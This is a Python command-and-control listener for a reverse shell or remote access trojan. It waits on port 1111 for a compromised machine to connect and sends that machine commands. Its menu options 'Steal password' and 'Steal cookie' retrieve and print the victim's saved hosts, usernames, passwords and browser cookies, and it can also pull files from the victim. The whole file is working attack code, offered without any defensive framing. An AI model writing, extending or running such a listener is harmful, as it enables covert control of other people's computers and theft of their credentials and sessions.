#!/usr/bin/python
import json
import socket
import os

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(2)
        print("[+] Waiting for a connection")
        self.connection, addr = listener.accept()
        print("[+] Got a connection from ", str(addr))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)

        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_receive()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(content)
            return "[+] Download successful."
    def run(self):
        while True:
            try:
                print("="*50)
                print("1. Steal password")
                print("2. Steal cookie")
                command = input(">> ")
                command = command.split(" ")
                result = self.execute_remotely(command)
                if command[0] == "download" and "Error" not in result:
                    result = self.write_file(command[1], result.encode())
                elif command[0] == "exploit" or command[0] == "1":
                    result = self.execute_remotely(command)
                    host = result[0]
                    username = result[1]
                    password = result[2]
                    for i in range(0,len(host)): 
                        print("Host: " ,host[i])
                        print("Username: " ,username[i])
                        print("Password: " ,password[i])
                        print("="*50)
                elif command[0] == "run" or command[0] == "2":
                    result = self.execute_remotely(command)
                    host = result[0]
                    name = result[1]
                    value = result[2]
                    cookie = result[3]
                    for i in range(0, len(name)):
                        print("Host: " ,host[i])
                        print("Name: " ,name[i])
                        print("Cookie: ",cookie[i])
                        print("Value: " ,value[i])
                        print("="*50)

                else:
                    print(result)
            except Exception as e:
                print("Exception: ", e)
                result = "[-] Error command execution"

# my_listener = Listener("192.168.0.108", 9999)
my_listener = Listener("0.0.0.0", 1111)

my_listener.run()
